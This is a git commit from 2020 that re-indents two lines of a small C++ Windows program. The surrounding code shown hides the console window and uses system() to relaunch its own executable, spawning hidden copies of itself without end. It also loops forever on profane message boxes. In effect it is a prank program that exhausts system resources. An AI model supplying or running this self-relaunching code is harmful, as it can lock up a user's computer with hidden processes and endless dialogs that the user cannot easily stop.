2c25bad411d6559b92949c06d74e0b244f25502d
StringError <59090017+StringError@users.noreply.github.com>
2020-05-04 16:06:03 +0800

    Update Using_it_to_nothing.cpp

--- Using_it_to_nothing.cpp
+++ Using_it_to_nothing.cpp
@@ -5,8 +5,8 @@ using namespace std;
 int main(){
 	HWND hwnd;
 	hwnd=FindWindow("ConsoleWindowClass",NULL);	
-    char path[1000];
-    GetModuleFileName(NULL, path, 1000);
+	char path[1000];
+	GetModuleFileName(NULL, path, 1000);
 	ShowWindow(hwnd,SW_HIDE);
 	system(path);
 	while(true) MessageBox(NULL,"There is nothing right, just f@ck you computer","F@CK",MB_OK);
